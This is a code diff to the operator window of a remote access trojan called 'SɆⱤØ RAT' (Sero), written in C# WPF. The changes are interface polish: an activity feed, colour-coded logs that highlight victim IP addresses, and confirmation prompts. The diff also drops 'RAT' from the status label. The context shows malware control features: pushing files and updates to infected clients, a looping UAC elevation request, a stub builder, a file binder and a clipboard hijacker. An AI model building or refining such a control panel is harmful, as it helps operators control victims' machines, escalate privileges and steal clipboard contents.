@@ -59,7 +59,42 @@ public partial class ServerWindow : Window
     private const int LogMaxLines = 2000;
     private const int LogTrimTo   = 1000;
     private System.Windows.Documents.Paragraph? _logPara;
-    private int _logUnseenCount;   // badge counter — reset when user opens the Logs tab
+
+    // Activity panel — tracks recent operations for the bottom status area
+    private readonly List<ActivityEntry> _recentActivity = [];
+    private record ActivityEntry(string Action, string Target, string Status, DateTime Time);
+    private void AddActivity(string action, string target, string status)
+    {
+        var entry = new ActivityEntry(action, target, status, DateTime.Now);
+        _recentActivity.Add(entry);
+        if (_recentActivity.Count > 8)
+            _recentActivity.RemoveAt(0);
+        RefreshActivityFeed();
+    }
+    private static readonly Brush _brushActivityRunning = MakeBrush(0x38, 0xBD, 0xF8); // sky blue
+    private static readonly Brush _brushActivityComplete = MakeBrush(0x4A, 0xDE, 0x80); // green
+    private static readonly Brush _brushActivityFailed = MakeBrush(0xF8, 0x71, 0x71); // red
+    private void SetStatus(string text, string? activityAction = null, string? activityTarget = null, string? activityStatus = null)
+    {
+        if (TxtStatusBar != null) TxtStatusBar.Text = text;
+        if (activityAction != null)
+            AddActivity(activityAction, activityTarget ?? "", activityStatus ?? "complete");
+    }
+
+    private void RefreshActivityFeed()
+    {
+        if (TxtActivityFeed == null) return;
+        var parts = new List<string>();
+        foreach (var a in _recentActivity)
+        {
+            var icon = a.Status == "running" ? "⋯" : a.Status == "failed" ? "✗" : "✓";
+            var time = a.Time.ToString("h:mm");
+            parts.Add($"{icon} {a.Action} {a.Target}  {time}");
+        }
+        TxtActivityFeed.Text = parts.Count > 0
+            ? string.Join("   ", parts)
+            : "";
+    }
 
     // Coloured log brushes (frozen = thread-safe, allocated once)
     private static readonly Brush _brushLogError      = MakeBrush(0xF8, 0x71, 0x71); // Soft Coral Red
@@ -69,6 +104,8 @@ public partial class ServerWindow : Window
     private static readonly Brush _brushLogAdmin      = MakeBrush(0xC0, 0x84, 0xFC); // Lavender Purple
     private static readonly Brush _brushLogTask       = MakeBrush(0x38, 0xBD, 0xF8); // Sky Blue
     private static readonly Brush _brushLogDefault    = MakeBrush(0x94, 0xA3, 0xB8); // Slate Gray
+    private static readonly Brush _brushLogTime       = MakeBrush(0x50, 0x58, 0x70); // Dim muted blue-gray for timestamp
+    private static readonly Brush _brushLogIP         = MakeBrush(0xF4, 0x72, 0xB6); // Pink for IP addresses
     private static readonly Brush _brushLogGood       = _brushLogSuccess;
     private static readonly Brush _brushLogDll        = _brushLogTask;
     private static Brush MakeBrush(byte r, byte g, byte b)
@@ -439,7 +476,7 @@ public partial class ServerWindow : Window
             UpdateClientCount();
             ScreenPanel.Children.Clear();
             _screenTiles.Clear();
-            TxtStatusLeft.Text = "SɆⱤØ RAT";
+            TxtStatusLeft.Text = "SɆⱤØ";
             TxtStatusLeft.Foreground = new SolidColorBrush(Color.FromRgb(0x2E, 0x30, 0x48));
             Log("[*] Server stopped.");
         }
@@ -533,7 +570,7 @@ public partial class ServerWindow : Window
                 BtnStartStop.Style = (Style)FindResource("SRedBtn");
                 _dashTimer.Start();
                 _uptimeTimer.Start();
-                TxtStatusLeft.Text = $"● Listening on :{port}";
+                TxtStatusLeft.Text = $"SɆⱤØ  ·  Listening on :{port}";
                 TxtStatusLeft.Foreground = (Brush)FindResource("GreenBrush");
 
                 // Discord RPC
@@ -561,7 +598,7 @@ public partial class ServerWindow : Window
             : (Brush)FindResource("RedBrush");
 
         ServerDot.Fill = brush;
-        TxtServerStatus.Text = running ? "Running" : "Stopped";
+        TxtServerStatus.Text = running ? "Listening" : "Not Listening";
     }
 
     private void UpdateClientCount()
@@ -903,10 +940,13 @@ public partial class ServerWindow : Window
     private async void DisconnectClient_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
-        if (_server == null) return;
+        if (_server == null || clients.Count == 0) return;
+        string msg = clients.Count == 1
+            ? $"Disconnect '{clients[0].Username}@{clients[0].IP}'?"
+            : $"Disconnect {clients.Count} clients?";
+        if (MessageBox.Show(msg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
         foreach (var client in clients)
         {
-            // Send Disconnect packet so stub sets ShouldReconnect=false before stream closes
             try { await _server.SendToClient(client.Id, new Packet { Type = PacketType.Disconnect }); } catch { }
             await Task.Delay(150);
             _server.DisconnectClient(client.Id);
@@ -1496,7 +1536,7 @@ public partial class ServerWindow : Window
             }
 
             Log($"[ADMIN] Sent {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s).");
-            TxtStatusBar.Text = $"File sent to {clients.Count} client(s).";
+            SetStatus($"File sent to {clients.Count} client(s).");
         }
         catch (Exception ex)
         {
@@ -1540,7 +1580,7 @@ public partial class ServerWindow : Window
             }
 
             Log($"[ADMIN] Sent update {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s). ");
-            TxtStatusBar.Text = $"Update file sent to {clients.Count} client(s).";
+            SetStatus($"Update file sent to {clients.Count} client(s).");
         }
         catch (Exception ex)
         {
@@ -1570,7 +1610,7 @@ public partial class ServerWindow : Window
             Log($"[ADMIN] Uninstall sent to {client.Username}@{client.IP} ({client.Id}).");
         }
 
-        TxtStatusBar.Text = $"Uninstall sent to {clients.Count} client(s).";
+        SetStatus($"Uninstall sent to {clients.Count} client(s).");
     }
 
     // ── UAC Elevation ───────────────────────────────
@@ -1587,7 +1627,7 @@ public partial class ServerWindow : Window
             Log($"[ADMIN] [UAC] Elevation request sent to {client.Username}@{client.IP}.");
         }
 
-        TxtStatusBar.Text = $"UAC elevation sent to {clients.Count} client(s).";
+        SetStatus($"UAC elevation sent to {clients.Count} client(s).");
     }
 
     private async void RequestElevationLoop_Click(object sender, RoutedEventArgs e)
@@ -1610,7 +1650,7 @@ public partial class ServerWindow : Window
             Log($"[ADMIN] [UAC] Elevation loop started on {client.Username}@{client.IP}.");
         }
 
-        TxtStatusBar.Text = $"UAC loop started on {clients.Count} client(s).";
+        SetStatus($"UAC loop started on {clients.Count} client(s).");
     }
 
     // ── Tags ────────────────────────────────────────
@@ -1639,7 +1679,7 @@ public partial class ServerWindow : Window
         foreach (var c in clients)
             GridClients.SelectedItems.Add(c);
 
-        TxtStatusBar.Text = $"Tag set on {clients.Count} client(s).";
+        SetStatus($"Tag set on {clients.Count} client(s).");
     }
 
     private void SetTagRecord_Click(object sender, RoutedEventArgs e)
@@ -1674,7 +1714,7 @@ public partial class ServerWindow : Window
 
         RefreshClients();
         RefreshAllClients();
-        TxtStatusBar.Text = $"Tag set on {records.Count} record(s).";
+        SetStatus($"Tag set on {records.Count} record(s).");
     }
 
     // ── Client Logs ─────────────────────────────────
@@ -1713,7 +1753,7 @@ public partial class ServerWindow : Window
 
         var hwids = string.Join("\n", clients.Select(c => c.Hwid));
         Clipboard.SetText(hwids);
-        TxtStatusBar.Text = clients.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {clients.Count} HWIDs";
+        SetStatus(clients.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {clients.Count} HWIDs");
     }
 
     private void CopyIP_Click(object sender, RoutedEventArgs e)
@@ -1723,7 +1763,7 @@ public partial class ServerWindow : Window
 
         var ips = string.Join("\n", clients.Select(c => c.IP));
         Clipboard.SetText(ips);
-        TxtStatusBar.Text = clients.Count == 1 ? $"Copied IP: {ips}" : $"Copied {clients.Count} IPs";
+        SetStatus(clients.Count == 1 ? $"Copied IP: {ips}" : $"Copied {clients.Count} IPs");
     }
 
     // ── Client search ─────────────────────────────────────────────────────────
@@ -1796,7 +1836,7 @@ public partial class ServerWindow : Window
 
         var hwids = string.Join("\n", records.Select(r => r.Hwid));
         Clipboard.SetText(hwids);
-        TxtStatusBar.Text = records.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {records.Count} HWIDs";
+        SetStatus(records.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {records.Count} HWIDs");
     }
 
     // ── Builder ─────────────────────────────────────
@@ -1920,7 +1960,7 @@ public partial class ServerWindow : Window
         if (result == MessageBoxResult.Yes)
         {
             SaveConfig();
-            TxtStatusBar.Text = "Configuration saved.";
+            SetStatus("Configuration saved.");
         }
     }
 
@@ -2000,12 +2040,6 @@ public partial class ServerWindow : Window
             if (cfg.TryGetValue("MaxClients", out var mc) && !string.IsNullOrEmpty(mc)) SettingsMaxClients.Text = mc;
             if (cfg.TryGetValue("DiscordRPC", out v)) SettingsDiscordRPC.IsChecked = v == "1";
             if (cfg.TryGetValue("NotifySound",  out v)) SettingsNotifySound.IsChecked  = v == "1";
-            if (cfg.TryGetValue("LogsBadge",    out v))
-            {
-                bool isB = v != "0";
-                SettingsLogsBadge.IsChecked = isB;
-                if (LogsTabBadgeToggle != null) LogsTabBadgeToggle.IsChecked = isB;
-            }
             if (cfg.TryGetValue("HideLogo", out v) && v == "1")
             {
                 SettingsHideLogo.IsChecked = true;
@@ -2074,7 +2108,6 @@ public partial class ServerWindow : Window
                 ["MaxClients"] = SettingsMaxClients.Text.Trim(),
                 ["DiscordRPC"] = SettingsDiscordRPC.IsChecked == true ? "1" : "0",
                 ["NotifySound"] = SettingsNotifySound.IsChecked == true ? "1" : "0",
-                ["LogsBadge"]  = SettingsLogsBadge.IsChecked  == true ? "1" : "0",
                 ["HideLogo"] = SettingsHideLogo.IsChecked == true ? "1" : "0",
                 ["BlockCapture"] = SettingsBlockCapture.IsChecked == true ? "1" : "0",
                 ["TelegramEnabled"] = BldTelegramEnabled.IsChecked == true ? "1" : "0",
@@ -3227,7 +3260,7 @@ Read-Host 'Press Enter to close'
                 : $"{size / (1024.0 * 1024.0):F1} MB";
             Log($"[+] Builder: {Path.GetFileName(outputExe)} ({size:N0} bytes) saved.");
             TxtBuildStatus.Text = $"Built: {Path.GetFileName(outputExe)} ({sizeStr})";
-            TxtStatusBar.Text = "Build successful.";
+            SetStatus("Build successful.");
             NotificationService.NotifyBuildSuccess();
 
             MessageBox.Show(
@@ -3307,7 +3340,7 @@ Read-Host 'Press Enter to close'
             var json = JsonSerializer.Serialize(configDict, new JsonSerializerOptions { WriteIndented = true });
             File.WriteAllText(dialog.FileName, json);
             Log($"[+] Builder: Config exported to {dialog.FileName}");
-            TxtStatusBar.Text = "Config exported.";
+            SetStatus("Config exported.");
         }
     }
 
@@ -3375,7 +3408,7 @@ Read-Host 'Press Enter to close'
             if (_server != null)
                 _server.MaxConnectedClients = max;
             Log($"[*] Max connected clients set to {max}.");
-            TxtStatusBar.Text = $"Settings applied (max clients: {max}).";
+            SetStatus($"Settings applied (max clients: {max}).");
             SaveConfig();
         }
         else
@@ -3471,31 +3504,6 @@ Read-Host 'Press Enter to close'
     {
         NotificationService.SetEnabled(SettingsNotifySound.IsChecked == true);
         SaveConfig();
-    }
-
-    private void SettingsLogsBadge_Changed(object sender, RoutedEventArgs e)
-    {
-        bool isChecked = SettingsLogsBadge.IsChecked == true;
-        if (LogsTabBadgeToggle != null && LogsTabBadgeToggle.IsChecked != isChecked)
-        {
-            LogsTabBadgeToggle.IsChecked = isChecked;
-        }
-        // Hide badge immediately when disabled
-        if (!isChecked)
-        {
-            _logUnseenCount = 0;
-            LogBadge.Visibility = Visibility.Collapsed;
-        }
-        SaveConfig();
-    }
-
-    private void LogsTabBadgeToggle_Changed(object sender, RoutedEventArgs e)
-    {
-        bool isChecked = LogsTabBadgeToggle.IsChecked == true;
-        if (SettingsLogsBadge != null && SettingsLogsBadge.IsChecked != isChecked)
-        {
-            SettingsLogsBadge.IsChecked = isChecked;
-        }
     }
 
     private void ClearLogs_Click(object sender, RoutedEventArgs e)
@@ -3841,11 +3849,22 @@ Read-Host 'Press Enter to close'
     private void AutoTask_Remove_Click(object sender, RoutedEventArgs e)
     {
         var selected = GridAutoTasks.SelectedItems.Cast<Data.AutoTaskEntry>().ToList();
+        if (selected.Count == 0) return;
+        string msg = selected.Count == 1
+            ? $"Remove auto-task '{selected[0].FileName}'?\nThis cannot be undone."
+            : $"Remove {selected.Count} auto-tasks?\nThis cannot be undone.";
+        if (MessageBox.Show(msg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
         foreach (var task in selected)
         {
             _autoTasks.Remove(task);
             Log($"[-] AutoTask: removed {task.FileName}");
         }
+    }
+
+    private void AutoTask_Refresh_Click(object sender, RoutedEventArgs e)
+    {
+        LoadConfig();
+        SetStatus("AutoTasks reloaded from config.");
     }
 
     private async Task ExecuteAutoTasksForAllConnected()
@@ -4063,7 +4082,7 @@ Read-Host 'Press Enter to close'
 
             CertificateHelper.ExportServerBackup(dialog.FileName, authKey);
             Log($"[+] Server backup exported to {dialog.FileName}");
-            TxtStatusBar.Text = "Server backup exported.";
+            SetStatus("Server backup exported.");
             MessageBox.Show(
                 $"Backup exporté :\n{dialog.FileName}\n\nContient le certificat TLS et la clé d'auth.\nImportez ce fichier sur une autre machine pour que les clients reconnectent.",
                 "Sero — Backup réussi", MessageBoxButton.OK, MessageBoxImage.Information);
@@ -4104,7 +4123,7 @@ Read-Host 'Press Enter to close'
                     SaveConfig();
                 }
                 Log("[+] Server backup restored (cert + auth key).");
-                TxtStatusBar.Text = "Backup restored.";
+                SetStatus("Backup restored.");
                 MessageBox.Show(
                     "Backup restauré.\nCertificat + clé d'auth restaurés.\nRedémarrez le serveur pour que les clients reconnectent.",
                     "Sero — Import réussi", MessageBoxButton.OK, MessageBoxImage.Information);
@@ -4120,7 +4139,7 @@ Read-Host 'Press Enter to close'
                 }
                 try { BldCertHash.Text = CertificateHelper.GetCertSha256Hash(); } catch { }
                 Log("[+] Certificate imported.");
-                TxtStatusBar.Text = "Certificate imported.";
+                SetStatus("Certificate imported.");
                 MessageBox.Show(
                     "Certificat importé.\nATTENTION : la clé d'auth n'est pas incluse dans un .pfx.\nVérifiez que la clé d'auth dans le Builder correspond à celle de vos stubs.",
                     "Sero — Import cert", MessageBoxButton.OK, MessageBoxImage.Warning);
@@ -4150,7 +4169,7 @@ Read-Host 'Press Enter to close'
 
             CertificateHelper.ExportPfx(dialog.FileName);
             Log($"[+] Certificate exported to {dialog.FileName}");
-            TxtStatusBar.Text = "Certificate exported.";
+            SetStatus("Certificate exported.");
             MessageBox.Show(
                 $"Certificat exporté :\n{dialog.FileName}\n\nATTENTION : Ce fichier ne contient pas la clé d'auth.\nUtilisez 'Backup' pour exporter cert + clé d'auth ensemble.",
                 "Sero — Export cert", MessageBoxButton.OK, MessageBoxImage.Warning);
@@ -4193,7 +4212,6 @@ Read-Host 'Press Enter to close'
     private void Log(string msg)
     {
         if (TxtLogs == null) return; // called before XAML init completes
-        var entry = $"[{DateTime.Now:HH:mm:ss}] {msg}";
         _logLineCount++;
 
         // Mirror to diagnostic file (never blocks UI — fire and forget)
@@ -4211,20 +4229,109 @@ Read-Host 'Press Enter to close'
             p.Inlines.Add(trimNote);
         }
 
-        var run = new System.Windows.Documents.Run(entry + "\n")
+        var para = EnsureLogParagraph();
+        foreach (var (text, brush) in TokenizeLogEntry(msg))
         {
-            Foreground = GetLogBrush(msg)
-        };
-        EnsureLogParagraph().Inlines.Add(run);
-        TxtLogs.ScrollToEnd();
-
-        // Badge: increment if the Logs tab isn't active and the user hasn't disabled it
-        if (LogsTabItem != null && !LogsTabItem.IsSelected && SettingsLogsBadge.IsChecked == true)
-        {
-            _logUnseenCount++;
-            LogBadgeTxt.Text = _logUnseenCount > 999 ? "999+" : $"+{_logUnseenCount}";
-            LogBadge.Visibility = Visibility.Visible;
+            var run = new System.Windows.Documents.Run(text) { Foreground = brush };
+            para.Inlines.Add(run);
         }
+
+        TxtLogs.ScrollToEnd();
+    }
+
+    private static readonly System.Text.RegularExpressions.Regex _ipRegex = new(
+        @"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",
+        System.Text.RegularExpressions.RegexOptions.Compiled);
+
+    private IEnumerable<(string text, Brush brush)> TokenizeLogEntry(string msg)
+    {
+        // Timestamp part
+        var now = DateTime.Now;
+        yield return ($"[{now:h:mm:ss tt}] ", _brushLogTime);
+
+        // Determine base brush for the message body
+        var bodyBrush = GetLogBrush(msg);
+
+        // Check for tags that should get their own color
+        string body = msg;
+        if (body.StartsWith("[!]"))
+        {
+            yield return ("[!]", _brushLogError);
+            body = body[3..];
+        }
+        else if (body.StartsWith("[+]"))
+        {
+            yield return ("[+]", _brushLogSuccess);
+            body = body[3..];
+        }
+        else if (body.StartsWith("[*]"))
+        {
+            yield return ("[*]", _brushLogSuccess);
+            body = body[3..];
+        }
+        else if (body.StartsWith("[ADMIN]"))
+        {
+            yield return ("[ADMIN]", _brushLogAdmin);
+            body = body[7..];
+        }
+        else if (body.StartsWith("[CLIPPER]"))
+        {
+            yield return ("[CLIPPER]", _brushLogTask);
+            body = body[9..];
+        }
+        else if (body.StartsWith("[UAC]"))
+        {
+            yield return ("[UAC]", _brushLogTask);
+            body = body[5..];
+        }
+        else if (body.StartsWith("[WATCHDOG]"))
+        {
+            yield return ("[WATCHDOG]", _brushLogError);
+            body = body[10..];
+        }
+        else if (body.StartsWith("[RATE]"))
+        {
+            yield return ("[RATE]", _brushLogError);
+            body = body[6..];
+        }
+        else if (body.StartsWith("[AUTH]"))
+        {
+            yield return ("[AUTH]", _brushLogError);
+            body = body[6..];
+        }
+        else if (body.StartsWith("[LIMIT]"))
+        {
+            yield return ("[LIMIT]", _brushLogError);
+            body = body[7..];
+        }
+        else if (body.StartsWith("[AT:"))
+        {
+            int end = body.IndexOf(']');
+            if (end > 0)
+            {
+                yield return (body[..(end + 1)], _brushLogTask);
+                body = body[(end + 1)..];
+            }
+        }
+        else if (body.StartsWith("[-]"))
+        {
+            yield return ("[-]", _brushLogDisconnect);
+            body = body[3..];
+        }
+
+        // Extract IP addresses from the remaining body and color them
+        int lastIdx = 0;
+        foreach (System.Text.RegularExpressions.Match match in _ipRegex.Matches(body))
+        {
+            if (match.Index > lastIdx)
+                yield return (body[lastIdx..match.Index], bodyBrush);
+            yield return (match.Value, _brushLogIP);
+            lastIdx = match.Index + match.Length;
+        }
+        if (lastIdx < body.Length)
+            yield return (body[lastIdx..], bodyBrush);
+
+        yield return ("\n", _brushLogDefault);
     }
 
     private void LogAdminAction(string friendlyName, int clientCount, string firstClientId)
@@ -4241,8 +4348,6 @@ Read-Host 'Press Enter to close'
 
     private void LogsTab_Selected()
     {
-        _logUnseenCount = 0;
-        LogBadge.Visibility = Visibility.Collapsed;
     }
 
     private System.Windows.Documents.Paragraph EnsureLogParagraph()
@@ -4716,7 +4821,17 @@ Read-Host 'Press Enter to close'
     private void BtnBinderRemove_Click(object sender, RoutedEventArgs e)
     {
         if (BinderGrid.SelectedItem is SeroServer.Binder.BinderEntry entry)
+        {
+            if (MessageBox.Show($"Remove '{entry.FileName}' from the binder?", "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
             _binderEntries.Remove(entry);
+        }
+    }
+
+    private void BtnBinderClearAll_Click(object sender, RoutedEventArgs e)
+    {
+        if (_binderEntries.Count == 0) return;
+        if (MessageBox.Show($"Clear all {_binderEntries.Count} entries from the binder?", "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
+        _binderEntries.Clear();
     }
 
     private void BtnBinderUp_Click(object sender, RoutedEventArgs e)
